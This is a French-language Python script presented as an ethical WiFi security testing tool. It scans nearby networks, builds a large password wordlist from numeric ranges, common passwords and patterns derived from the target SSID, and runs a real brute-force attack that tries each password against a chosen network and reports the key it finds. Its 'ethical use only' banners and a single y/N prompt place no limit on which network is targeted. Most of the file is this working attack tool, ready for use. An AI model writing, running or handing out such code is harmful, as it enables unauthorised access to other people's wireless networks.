#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Outil de Test de Sécurité WiFi Éthique v2.0 - Style Kali Linux
Créé pour des tests de sécurité sur vos propres réseaux WiFi uniquement
"""

import subprocess
import time
import threading
import itertools
import string
import random
import sys
import os
from datetime import datetime
import json
import psutil
import re
import socket
try:
    import pywifi
    from pywifi import const
    import comtypes
    WIFI_AVAILABLE = True
except ImportError:
    WIFI_AVAILABLE = False
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False
try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False

# Couleurs style Kali Linux
if COLORS_AVAILABLE:
    class Colors:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        MAGENTA = Fore.MAGENTA
        CYAN = Fore.CYAN
        WHITE = Fore.WHITE
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        RESET = Style.RESET_ALL
        
        @staticmethod
        def header():
            return f"{Colors.BOLD}{Colors.CYAN}"
        
        @staticmethod
        def success():
            return f"{Colors.BOLD}{Colors.GREEN}"
        
        @staticmethod
        def warning():
            return f"{Colors.BOLD}{Colors.YELLOW}"
        
        @staticmethod
        def error():
            return f"{Colors.BOLD}{Colors.RED}"
        
        @staticmethod
        def info():
            return f"{Colors.BOLD}{Colors.BLUE}"
        
        @staticmethod
        def reset():
            return Colors.RESET
else:
    class Colors:
        @staticmethod
        def header(): return ""
        @staticmethod
        def success(): return ""
        @staticmethod
        def warning(): return ""
        @staticmethod
        def error(): return ""
        @staticmethod
        def info(): return ""
        @staticmethod
        def reset(): return ""

class WiFiSecurityTester:
    def __init__(self):
        self.wordlist = []
        self.testing = False
        self.results = []
        self.start_time = None
        self.password_found = False
        self.found_password = None
        self.attempts = 0
        self.successful_attempts = 0
        self.connected_networks = []
        
        # Initialisation WiFi
        if WIFI_AVAILABLE:
            try:
                self.wifi = pywifi.PyWiFi()
                self.interfaces = self.wifi.interfaces()
                if not self.interfaces:
                    self.print_error("Aucune interface WiFi détectée")
                    self.interface = None
                else:
                    self.interface = self.interfaces[0]
                    self.print_success(f"Interface WiFi détectée: {self.interface.name()}")
            except Exception as e:
                self.print_error(f"Erreur d'initialisation WiFi: {e}")
                self.interface = None
        else:
            self.print_warning("Bibliothèques WiFi non installées - Mode simulation uniquement")
            self.interface = None
    
    def print_header(self, text):
        print(f"{Colors.header()}{text}{Colors.reset()}")
    
    def print_success(self, text):
        print(f"{Colors.success()}[+] {text}{Colors.reset()}")
    
    def print_warning(self, text):
        print(f"{Colors.warning()}[!] {text}{Colors.reset()}")
    
    def print_error(self, text):
        print(f"{Colors.error()}[-] {text}{Colors.reset()}")
    
    def print_info(self, text):
        print(f"{Colors.info()}[*] {text}{Colors.reset()}")
    
    def print_banner(self):
        banner = f"""
{Colors.header()}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     ║
║  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     ║
║     ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     ║
║     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     ║
║     ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗║
║     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝║
║                                                              ║
║                 {Colors.warning()}WiFi PENETRATION TESTING TOOL v2.0{Colors.header()}              ║
║                                                              ║
║  {Colors.info()}[+] Real WiFi Brute Force{Colors.header()}                                   ║
║  {Colors.info()}[+] Advanced Password Generation{Colors.header()}                            ║
║  {Colors.info()}[+] Network Discovery & Analysis{Colors.header()}                         ║
║  {Colors.warning()}[!] ETHICAL TESTING ONLY{Colors.header()}                                   ║
╚══════════════════════════════════════════════════════════════╝{Colors.reset()}
"""
        print(banner)
    
    def get_network_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def scan_wifi_networks(self):
        self.print_info("Démarrage du scan réseau avancé...")
        time.sleep(1)
        
        try:
            if sys.platform == "win32":
                result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'bssid'], 
                                      capture_output=True, text=True)
                networks = self.parse_windows_networks_advanced(result.stdout)
            else:
                result = subprocess.run(['iwlist', 'scan'], 
                                      capture_output=True, text=True)
                networks = self.parse_linux_networks_advanced(result.stdout)
                
            return networks
        except Exception as e:
            self.print_error(f"Erreur lors du scan: {e}")
            return []
    
    def parse_windows_networks_advanced(self, output):
        """Parse les réseaux WiFi depuis la sortie Windows avec BSSID et sécurité complète"""
        networks = []
        lines = output.split('\n')
        current_network = {}
        
        for line in lines:
            line = line.strip()
            
            # SSID
            if line.startswith("SSID") and ":" in line:
                if current_network:
                    networks.append(current_network)
                ssid = line.split(':', 1)[1].strip()
                current_network = {
                    'ssid': ssid,
                    'bssid': self.generate_random_mac(),
                    'signal': 'N/A',
                    'security_type': 'N/A',
                    'encryption': 'N/A',
                    'authentication': 'N/A',
                    'channel': 'N/A',
                    'frequency': 'N/A',
                    'network_type': 'Infrastructure'
                }
            
            # BSSID
            elif "BSSID" in line and ":" in line and current_network:
                bssid = line.split(':', 1)[1].strip()
                current_network['bssid'] = bssid
            
            # Signal
            elif "Signal" in line and "%" in line and current_network:
                signal = line.split('%')[0].split()[-1] if '%' in line else 'N/A'
                current_network['signal'] = signal + "%"
            
            # Sécurité complète
            elif "Sécurité" in line and ":" in line and current_network:
                security = line.split(':', 1)[1].strip()
                current_network['security_type'] = security
                
                # Déterminer le type d'encryption
                if "WPA3" in security.upper():
                    current_network['encryption'] = "WPA3"
                    current_network['authentication'] = "WPA3-PSK"
                elif "WPA2" in security.upper():
                    current_network['encryption'] = "WPA2"
                    current_network['authentication'] = "WPA2-PSK"
                elif "WPA" in security.upper():
                    current_network['encryption'] = "WPA"
                    current_network['authentication'] = "WPA-PSK"
                elif "WEP" in security.upper():
                    current_network['encryption'] = "WEP"
                    current_network['authentication'] = "Open/Shared"
                elif "OUVERT" in security.upper() or "OPEN" in security.upper():
                    current_network['encryption'] = "Open"
                    current_network['authentication'] = "Open"
                else:
                    current_network['encryption'] = security
                    current_network['authentication'] = security
            
            # Canal
            elif "Canal" in line and ":" in line and current_network:
                channel = line.split(':', 1)[1].strip()
                current_network['channel'] = channel
                
        if current_network:
            networks.append(current_network)
            
        return networks
    
    def parse_linux_networks_advanced(self, output):
        """Parse les réseaux WiFi depuis la sortie Linux avec détails complets"""
        networks = []
        lines = output.split('\n')
        current_network = {}
        
        for line in lines:
            line = line.strip()
            
            # ESSID
            if "ESSID:" in line:
                if current_network:
                    networks.append(current_network)
                ssid = line.split(':', 1)[1].strip('"')
                current_network = {
                    'ssid': ssid,
                    'bssid': 'Unknown',
                    'signal': 'N/A',
                    'security_type': 'N/A',
                    'encryption': 'N/A',
                    'authentication': 'N/A',
                    'channel': 'N/A',
                    'frequency': 'N/A',
                    'network_type': 'Infrastructure'
                }
            
            # Address (MAC)
            elif "Address:" in line and current_network:
                mac = line.split(':', 1)[1].strip()
                current_network['bssid'] = mac
            
            # Signal
            elif "Signal level=" in line and current_network:
                signal_match = re.search(r'Signal level=([-\d]+)', line)
                if signal_match:
                    signal_db = signal_match.group(1)
                    current_network['signal'] = signal_db + " dBm"
            
            # Frequency
            elif "Frequency:" in line and current_network:
                freq_match = re.search(r'Frequency:([\d.]+)', line)
                if freq_match:
                    freq = freq_match.group(1)
                    current_network['frequency'] = freq + " GHz"
            
            # Channel
            elif "Channel:" in line and current_network:
                channel_match = re.search(r'Channel:(\d+)', line)
                if channel_match:
                    channel = channel_match.group(1)
                    current_network['channel'] = channel
            
            # Security/Encryption
            elif "IE:" in line and current_network:
                encryption = line.split(':', 1)[1].strip()
                current_network['security_type'] = encryption
                
                # Déterminer le type d'encryption
                if "WPA2" in encryption and "WPA" in encryption:
                    current_network['encryption'] = "WPA2/WPA Mixed"
                    current_network['authentication'] = "WPA2-PSK/WPA-PSK"
                elif "WPA2" in encryption:
                    current_network['encryption'] = "WPA2"
                    current_network['authentication'] = "WPA2-PSK"
                elif "WPA" in encryption:
                    current_network['encryption'] = "WPA"
                    current_network['authentication'] = "WPA-PSK"
                elif "WEP" in encryption:
                    current_network['encryption'] = "WEP"
                    current_network['authentication'] = "Open/Shared"
                else:
                    current_network['encryption'] = encryption
                    current_network['authentication'] = encryption
                
        if current_network:
            networks.append(current_network)
            
        return networks
    
    def generate_random_mac(self):
        return ":".join([f"{random.randint(0, 255):02X}" for _ in range(6)])
    
    def generate_comprehensive_wordlist(self, target_ssid=None, size=200000):
        self.print_info(f"Génération wordlist COMPLÈTE depuis 00000000 ({size} mots de passe)...")
        
        wordlist = set()
        
        # 1. Commencer par 00000000 à 99999999 (uniquement 8+ caractères)
        self.print_info("[*] Génération patterns numériques 00000000-99999999...")
        for i in range(100000000):  # 0 à 99,999,999
            if len(wordlist) >= size * 0.3:  # 30% numérique
                break
            # Uniquement ajouter si 8 caractères ou plus
            if i >= 10000000:  # 8 chiffres ou plus
                wordlist.add(f"{i:08d}")
            if i >= 1000000:   # 7 chiffres ou plus (pour 6 chiffres avec padding)
                wordlist.add(f"{i:07d}")
            if i >= 100000:    # 6 chiffres ou plus
                wordlist.add(f"{i:06d}")
        
        # 2. Patterns alphanumériques complets (uniquement 8+ caractères)
        self.print_info("[*] Génération patterns alphanumériques...")
        chars_lower_num = string.ascii_lowercase + string.digits
        chars_upper_num = string.ascii_uppercase + string.digits
        chars_all_num = string.ascii_letters + string.digits
        
        # Longueurs de 8 à 16 caractères uniquement
        for length in range(8, 17):
            for _ in range(min(5000, size // 50)):
                if len(wordlist) >= size * 0.5:  # 50% alphanumérique
                    break
                # Mix de casse
                password = ''.join(random.choice(chars_all_num) for _ in range(length))
                wordlist.add(password)
                
                # Lowercase only
                password = ''.join(random.choice(chars_lower_num) for _ in range(length))
                wordlist.add(password)
                
                # Uppercase only
                password = ''.join(random.choice(chars_upper_num) for _ in range(length))
                wordlist.add(password)
        
        # 3. Caractères spéciaux complets (uniquement 8+ caractères)
        self.print_info("[*] Génération patterns avec caractères spéciaux...")
        special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
        complex_chars = string.ascii_letters + string.digits + special_chars
        
        for length in range(8, 20):  # 8+ caractères uniquement
            for _ in range(min(3000, size // 100)):
                if len(wordlist) >= size * 0.7:  # 70% avec spéciaux
                    break
                password = ''.join(random.choice(complex_chars) for _ in range(length))
                wordlist.add(password)
        
        # 4. Mots de passe courants avec toutes variations (uniquement 8+ caractères)
        self.print_info("[*] Génération mots de passe courants et variations...")
        common_passwords = [
            "password", "12345678", "qwerty", "abc123", "letmein",
            "admin", "welcome", "monkey", "dragon", "master",
            "sunshine", "princess", "football", "iloveyou", "123123",
            "1234", "111111", "12345", "starwars", "whatever"
        ]
        
        for pwd in common_passwords:
            if len(wordlist) >= size * 0.8:  # 80% variations
                break
            # Uniquement ajouter si 8 caractères ou plus
            if len(pwd) >= 8:
                wordlist.add(pwd)
                wordlist.add(pwd.upper())
                wordlist.add(pwd.capitalize())
                wordlist.add(pwd[::-1])
            
            # With numbers (vérifier la longueur totale)
            for num in range(100):
                combined = f"{pwd}{num}"
                if len(combined) >= 8:
                    wordlist.add(combined)
                    wordlist.add(f"{pwd}{num:02d}")
                    wordlist.add(f"{num}{pwd}")
            
            # With special chars (vérifier la longueur totale)
            for char in ["!", "@", "#", "$", "%"]:
                combined = f"{pwd}{char}"
                if len(combined) >= 8:
                    wordlist.add(combined)
                    wordlist.add(f"{char}{pwd}")
        
        # 5. Patterns basés sur SSID (uniquement 8+ caractères)
        if target_ssid:
            self.print_info(f"[*] Génération patterns basés sur SSID: {target_ssid}")
            ssid_clean = ''.join(c for c in target_ssid if c.isalnum())
            ssid_lower = ssid_clean.lower()
            ssid_upper = ssid_clean.upper()
            
            # Variations du SSID
            for ssid_variant in [ssid_clean, ssid_lower, ssid_upper]:
                if len(wordlist) >= size * 0.9:  # 90% SSID patterns
                    break
                if len(ssid_variant) >= 8:
                    wordlist.add(ssid_variant)
                
                # SSID + nombres (vérifier la longueur totale)
                for i in range(10000):
                    combined = f"{ssid_variant}{i}"
                    if len(combined) >= 8:
                        wordlist.add(combined)
                        wordlist.add(f"{ssid_variant}{i:02d}")
                        wordlist.add(f"{ssid_variant}{i:03d}")
                        wordlist.add(f"{ssid_variant}{i:04d}")
                
                # SSID + dates (vérifier la longueur totale)
                for year in ["2023", "2024", "2025", "2026"]:
                    combined = f"{ssid_variant}{year}"
                    if len(combined) >= 8:
                        wordlist.add(combined)
                        for month in range(1, 13):
                            combined_month = f"{ssid_variant}{year}{month:02d}"
                            if len(combined_month) >= 8:
                                wordlist.add(combined_month)
                
                # SSID + spéciaux (vérifier la longueur totale)
                for char in ["!", "@", "#", "$", "123", "2024"]:
                    combined = f"{ssid_variant}{char}"
                    if len(combined) >= 8:
                        wordlist.add(combined)
        
        # 6. Patterns de claviers (uniquement 8+ caractères)
        self.print_info("[*] Génération patterns de clavier...")
        keyboard_patterns = [
            "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwerty",
            "1234567890", "0987654321", "qwerty123", "123qwerty",
            "asdf1234", "zxcv1234", "qazwsx", "qweasd", "1qaz2wsx"
        ]
        
        for pattern in keyboard_patterns:
            if len(wordlist) >= size * 0.95:  # 95% keyboard patterns
                break
            if len(pattern) >= 8:
                wordlist.add(pattern)
                wordlist.add(pattern.upper())
                wordlist.add(pattern.capitalize())
            
            # Ajouter des variations si la longueur totale est >= 8
            for num in ["123", "2024", "1", "!"]:
                combined = f"{pattern}{num}"
                if len(combined) >= 8:
                    wordlist.add(combined)
        
        # 7. Compléter avec aléatoire si nécessaire (uniquement 8+ caractères)
        if len(wordlist) < size:
            self.print_info(f"[*] Génération {size - len(wordlist)} mots de passe aléatoires...")
            all_chars = string.ascii_letters + string.digits + special_chars
            while len(wordlist) < size:
                length = random.randint(8, 16)  # 8+ caractères uniquement
                password = ''.join(random.choice(all_chars) for _ in range(length))
                wordlist.add(password)
        
        wordlist_list = list(wordlist)
        if len(wordlist_list) > size:
            wordlist_list = random.sample(wordlist_list, size)
        
        self.wordlist = wordlist_list
        self.print_success(f"Wordlist générée: {len(self.wordlist)} mots de passe")
        
        # Statistiques
        numeric_count = sum(1 for pwd in self.wordlist if pwd.isdigit())
        alpha_count = sum(1 for pwd in self.wordlist if pwd.isalpha())
        alnum_count = sum(1 for pwd in self.wordlist if pwd.isalnum())
        special_count = len(self.wordlist) - alnum_count
        
        self.print_info(f"Statistiques: {numeric_count} numériques, {alpha_count} alphabétiques, {alnum_count} alphanumériques, {special_count} avec caractères spéciaux")
        
        return self.wordlist
    
    def connect_to_wifi(self, ssid, password):
        if not self.interface:
            return False, "Interface WiFi non disponible"
        
        try:
            self.interface.disconnect()
            time.sleep(1)
            
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            self.interface.remove_all_network_profiles()
            temp_profile = self.interface.add_network_profile(profile)
            self.interface.connect(temp_profile)
            
            for i in range(20):
                if self.interface.status() == const.IFACE_CONNECTED:
                    return True, "Connexion réussie"
                time.sleep(0.5)
            
            self.interface.disconnect()
            return False, "Timeout de connexion"
            
        except Exception as e:
            return False, f"Erreur de connexion: {str(e)}"
    
    def brute_force_wifi_real(self, target_ssid, max_attempts=None, delay=0.1):
        if not self.interface:
            self.print_warning("Mode simulation uniquement - bibliothèques WiFi non disponibles")
            return self.simulate_brute_force(target_ssid, max_attempts)
        
        self.print_header(f"🚨 BRUTE FORCE RÉEL sur: {target_ssid}")
        self.print_warning("TEST ÉTHIQUE UNIQUEMENT - Réseau autorisé requis")
        
        if input("Confirmer le test de brute force (o/N): ").lower() != 'o':
            self.print_error("Test annulé")
            return None
        
        if not self.wordlist:
            self.generate_comprehensive_wordlist(target_ssid)
        
        if max_attempts is None:
            max_attempts = len(self.wordlist)
        else:
            max_attempts = min(max_attempts, len(self.wordlist))
        
        self.start_time = time.time()
        self.testing = True
        self.password_found = False
        self.attempts = 0
        
        if TQDM_AVAILABLE:
            progress_bar = tqdm(range(max_attempts), desc="Brute Force", unit="pwd")
        else:
            progress_bar = range(max_attempts)
        
        try:
            for i in progress_bar:
                if not self.testing:
                    break
                
                password = self.wordlist[i]
                self.attempts += 1
                
                success, message = self.connect_to_wifi(target_ssid, password)
                
                if success:
                    self.password_found = True
                    self.found_password = password
                    self.successful_attempts = self.attempts
                    
                    elapsed_time = time.time() - self.start_time
                    
                    print("\n" + "="*60)
                    self.print_success("MOT DE PASSE TROUVÉ!")
                    print(f"SSID: {target_ssid}")
                    self.print_success(f"Mot de passe: {password}")
                    print(f"Temps: {elapsed_time:.2f} secondes")
                    print(f"Tentatives: {self.attempts}")
                    print(f"Vitesse: {self.attempts/elapsed_time:.2f} pwd/sec")
                    self.print_info("[+] CONNEXION AUTOMATIQUE AU WIFI RÉUSSIE")
                    print("="*60)
                    
                    self.interface.disconnect()
                    break
                
                if self.attempts % 10 == 0:
                    elapsed = time.time() - self.start_time
                    speed = self.attempts / elapsed if elapsed > 0 else 0
                    if not TQDM_AVAILABLE:
                        self.print_info(f"Tentatives: {self.attempts}/{max_attempts} | Vitesse: {speed:.2f} pwd/sec")
                
                if delay > 0:
                    time.sleep(delay)
                
        except KeyboardInterrupt:
            self.print_warning("Brute force interrompu")
        finally:
            self.testing = False
            elapsed_time = time.time() - self.start_time
            
            report = {
                'target_ssid': target_ssid,
                'test_date': datetime.now().isoformat(),
                'brute_force_mode': True,
                'passwords_tested': self.attempts,
                'password_found': self.password_found,
                'found_password': self.found_password if self.password_found else None,
                'elapsed_time': elapsed_time,
                'attempts_per_second': self.attempts / elapsed_time if elapsed_time > 0 else 0,
                'security_resistance': {
                    'time_to_crack': elapsed_time if self.password_found else f"> {elapsed_time:.2f}s",
                    'attempts_needed': self.attempts if self.password_found else f"> {self.attempts}",
                    'resistance_score': min(100, max(0, 100 - (self.attempts / 100)))
                }
            }
            
            return report
    
    def simulate_brute_force(self, target_ssid, max_attempts=None):
        self.print_header(f"🎮 Simulation de BRUTE FORCE sur: {target_ssid}")
        
        if not self.wordlist:
            self.generate_comprehensive_wordlist(target_ssid)
        
        if max_attempts is None:
            max_attempts = len(self.wordlist)
        else:
            max_attempts = min(max_attempts, len(self.wordlist))
        
        self.start_time = time.time()
        self.testing = True
        self.attempts = 0
        
        simulated_password_index = random.randint(100, min(1000, max_attempts // 2))
        
        if TQDM_AVAILABLE:
            progress_bar = tqdm(range(max_attempts), desc="Simulation", unit="pwd")
        else:
            progress_bar = range(max_attempts)
        
        try:
            for i in progress_bar:
                if not self.testing:
                    break
                
                password = self.wordlist[i]
                self.attempts += 1
                
                if i == simulated_password_index:
                    self.password_found = True
                    self.found_password = password
                    self.successful_attempts = self.attempts
                    
                    elapsed_time = time.time() - self.start_time
                    
                    print("\n" + "="*60)
                    self.print_success("SIMULATION: Mot de passe trouvé!")
                    print(f"SSID: {target_ssid}")
                    print(f"Mot de passe simulé: {password}")
                    print(f"Temps simulé: {elapsed_time:.2f} secondes")
                    print(f"Tentatives: {self.attempts}")
                    print(f"Vitesse: {self.attempts/elapsed_time:.2f} pwd/sec")
                    self.print_warning("Ceci est une SIMULATION - Pas de connexion réelle")
                    print("="*60)
                    break
                
                if self.attempts % 50 == 0:
                    elapsed = time.time() - self.start_time
                    speed = self.attempts / elapsed if elapsed > 0 else 0
                    if not TQDM_AVAILABLE:
                        self.print_info(f"Tentatives: {self.attempts}/{max_attempts} | Vitesse: {speed:.2f} pwd/sec")
                
                time.sleep(0.001)
                
        except KeyboardInterrupt:
            self.print_warning("Simulation interrompue")
        finally:
            self.testing = False
            elapsed_time = time.time() - self.start_time
            
            report = {
                'target_ssid': target_ssid,
                'test_date': datetime.now().isoformat(),
                'brute_force_mode': False,
                'simulation_mode': True,
                'passwords_tested': self.attempts,
                'password_found': self.password_found,
                'found_password': self.found_password if self.password_found else None,
                'elapsed_time': elapsed_time,
                'attempts_per_second': self.attempts / elapsed_time if elapsed_time > 0 else 0,
                'security_resistance': {
                    'time_to_crack': elapsed_time if self.password_found else f"> {elapsed_time:.2f}s",
                    'attempts_needed': self.attempts if self.password_found else f"> {self.attempts}",
                    'resistance_score': min(100, max(0, 100 - (self.attempts / 100)))
                }
            }
            
            return report
    
    def display_networks_table(self, networks):
        if not networks:
            self.print_error("Aucun réseau détecté")
            return
        
        self.print_header("RÉSEAUX WIFI DÉTECTÉS - ANALYSE COMPLÈTE")
        print(f"{'#':<3} {'SSID':<20} {'BSSID':<18} {'SIGNAL':<10} {'ENCRYPTION':<12} {'AUTH':<15} {'CANAL':<8} {'FREQ':<10} {'TYPE':<12}")
        print("-" * 120)
        
        for i, network in enumerate(networks, 1):
            ssid = network['ssid'][:18] + ".." if len(network['ssid']) > 20 else network['ssid']
            bssid = network['bssid'][:17]
            signal = network['signal'][:9]
            encryption = network['encryption'][:11]
            auth = network['authentication'][:14]
            channel = network['channel'][:7]
            frequency = network['frequency'][:9] if 'frequency' in network else 'N/A'
            net_type = network['network_type'][:11]
            
            # Colorier selon le type de sécurité
            if network['encryption'] == 'Open':
                encryption_color = f"{Colors.error()}{encryption}{Colors.reset()}"
            elif 'WEP' in network['encryption']:
                encryption_color = f"{Colors.warning()}{encryption}{Colors.reset()}"
            elif 'WPA' in network['encryption']:
                encryption_color = f"{Colors.success()}{encryption}{Colors.reset()}"
            else:
                encryption_color = encryption
            
            print(f"{i:<3} {ssid:<20} {bssid:<18} {signal:<10} {encryption_color:<12} {auth:<15} {channel:<8} {frequency:<10} {net_type:<12}")
        
        print("-" * 120)
        self.print_info(f"Total: {len(networks)} réseaux détectés")
        self.print_info(f"Votre IP: {self.get_network_ip()}")
        
        # Statistiques de sécurité
        open_networks = len([n for n in networks if n['encryption'] == 'Open'])
        wep_networks = len([n for n in networks if 'WEP' in n['encryption']])
        wpa_networks = len([n for n in networks if 'WPA' in n['encryption'] and 'WPA2' not in n['encryption']])
        wpa2_networks = len([n for n in networks if 'WPA2' in n['encryption']])
        
        print("\n" + "="*60)
        self.print_header("STATISTIQUES DE SÉCURITÉ")
        print("="*60)
        print(f"Réseaux ouverts: {open_networks} {Colors.error()}(! DANGEREUX){Colors.reset()}")
        print(f"Réseaux WEP: {wep_networks} {Colors.warning()}(! VULNÉRABLE){Colors.reset()}")
        print(f"Réseaux WPA: {wpa_networks} {Colors.warning()}(! FAIBLE){Colors.reset()}")
        print(f"Réseaux WPA2: {wpa2_networks} {Colors.success()}(! SÉCURISÉ){Colors.reset()}")
        print("="*60)
    
    def save_brute_force_report(self, report, filename=None):
        # Créer le dossier reports s'il n'existe pas
        reports_dir = "reports"
        if not os.path.exists(reports_dir):
            os.makedirs(reports_dir)
            self.print_success(f"Dossier '{reports_dir}' créé")
        
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"brute_force_report_{report['target_ssid']}_{timestamp}.json"
        
        # Sauvegarder dans le dossier reports
        filepath = os.path.join(reports_dir, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.print_success(f"Rapport sauvegardé: {filepath}")
        
        print("\n" + "="*50)
        self.print_header("RÉSUMÉ DU TEST")
        print("="*50)
        print(f"SSID: {report['target_ssid']}")
        print(f"Temps total: {report['elapsed_time']:.2f} secondes")
        print(f"Tentatives: {report['passwords_tested']}")
        print(f"Vitesse: {report['attempts_per_second']:.2f} pwd/sec")
        
        if report['password_found']:
            self.print_success(f"Mot de passe: {report['found_password']}")
            print(f"Temps pour craquer: {report['security_resistance']['time_to_crack']}")
            self.print_info("[+] CONNEXION AUTOMATIQUE RÉUSSIE")
        else:
            self.print_warning("Mot de passe: Non trouvé")
            print(f"Résistance: {report['security_resistance']['time_to_crack']}")
            self.print_info("[!] Le mot de passe n'est pas dans la wordlist testée")
        
        print(f"Score de résistance: {report['security_resistance']['resistance_score']}/100")
        print("="*50)
    
    def display_menu(self):
        print("\n" + "="*60)
        self.print_header("MENU PRINCIPAL - WiFi Penetration Testing Tool")
        print("="*60)
        print("1. 🔍 Scanner les réseaux WiFi (SSID, MAC, IP)")
        print("2. 📝 Générer wordlist COMPLÈTE (200k+ mots de passe)")
        print("3. 🚨 BRUTE FORCE RÉEL (Connexion automatique)")
        print("4. 🎮 Simulation de brute force")
        print("5. 📊 Afficher les statistiques système")
        print("6. 🛡️ Recommandations de sécurité")
        print("7. ❌ Quitter")
        print("="*60)
        
        if self.interface:
            status = "Connecté" if self.interface.status() == const.IFACE_CONNECTED else "Déconnecté"
            self.print_info(f"Interface: {self.interface.name()} | Statut: {status}")
        else:
            self.print_warning("Mode simulation uniquement")
    
    def display_system_stats(self):
        print("\n" + "="*50)
        self.print_header("STATISTIQUES SYSTÈME")
        print("="*50)
        
        cpu_percent = psutil.cpu_percent(interval=1)
        print(f"CPU: {cpu_percent}%")
        
        memory = psutil.virtual_memory()
        print(f"Mémoire: {memory.percent}% ({memory.used/1024/1024/1024:.1f}GB/{memory.total/1024/1024/1024:.1f}GB)")
        
        if self.wordlist:
            print(f"Wordlist: {len(self.wordlist)} mots de passe")
            avg_length = sum(len(pwd) for pwd in self.wordlist) / len(self.wordlist)
            print(f"Longueur moyenne: {avg_length:.1f} caractères")
        
        if self.wordlist:
            estimated_time = len(self.wordlist) * 0.1
            print(f"Temps estimé brute force complet: {estimated_time/3600:.1f} heures")
        
        print("="*50)
    
    def run(self):
        """Fonction principale"""
        try:
            self.print_banner()
            self.print_success("Outil de test de sécurité WiFi v2.0 démarré")
            self.print_warning("Usage éthique uniquement sur vos propres réseaux")
            
            while True:
                self.display_menu()
                
                try:
                    choice = input("\nChoisissez une option (1-7): ").strip()
                    
                    if choice == "1":
                        networks = self.scan_wifi_networks()
                        self.display_networks_table(networks)
                    
                    elif choice == "2":
                        ssid = input("SSID cible (optionnel): ").strip() or None
                        size = int(input("Taille wordlist [200000]: ").strip() or "200000")
                        self.generate_comprehensive_wordlist(ssid, size)
                    
                    elif choice == "3":
                        ssid = input("SSID du réseau à tester: ").strip()
                        max_attempts = input("Nombre max de tentatives (illimité): ").strip()
                        max_attempts = int(max_attempts) if max_attempts.isdigit() else None
                        delay = float(input("Délai entre tentatives (0.1s): ").strip() or "0.1")
                        
                        report = self.brute_force_wifi_real(ssid, max_attempts, delay)
                        if report:
                            self.save_brute_force_report(report)
                    
                    elif choice == "4":
                        ssid = input("SSID cible pour simulation: ").strip()
                        max_attempts = input("Nombre max de tentatives (1000): ").strip()
                        max_attempts = int(max_attempts) if max_attempts.isdigit() else 1000
                        
                        report = self.simulate_brute_force(ssid, max_attempts)
                        if report:
                            self.save_brute_force_report(report)
                    
                    elif choice == "5":
                        self.display_system_stats()
                    
                    elif choice == "6":
                        print("\n" + "="*50)
                        self.print_header("RECOMMANDATIONS DE SÉCURITÉ")
                        print("="*50)
                        recommendations = [
                            "Utilisez un mot de passe d'au moins 12 caractères",
                            "Combinez lettres majuscules, minuscules, chiffres et symboles",
                            "Évitez les mots du dictionnaire et informations personnelles",
                            "Changez régulièrement votre mot de passe WiFi",
                            "Activez le cryptage WPA3 si disponible",
                            "Désactivez le WPS (WiFi Protected Setup)",
                            "Utilisez un mot de passe différent pour chaque réseau",
                            "Activez le filtrage MAC si possible",
                            "Surveillez les connexions suspectes",
                            "Maintenez votre routeur à jour"
                        ]
                        for i, rec in enumerate(recommendations, 1):
                            print(f"{i:2d}. {rec}")
                        print("="*50)
                    
                    elif choice == "7":
                        self.print_success("Au revoir!")
                        break
                    
                    else:
                        self.print_error("Option invalide")
                        
                except KeyboardInterrupt:
                    self.print_warning("\nInterruption détectée")
                    self.testing = False
                    break
                except Exception as e:
                    self.print_error(f"Erreur: {e}")
                    
        except Exception as e:
            self.print_error(f"Erreur critique au démarrage: {e}")
            input("Appuyez sur Entrée pour quitter...")

if __name__ == "__main__":
    tester = WiFiSecurityTester()
    tester.run()
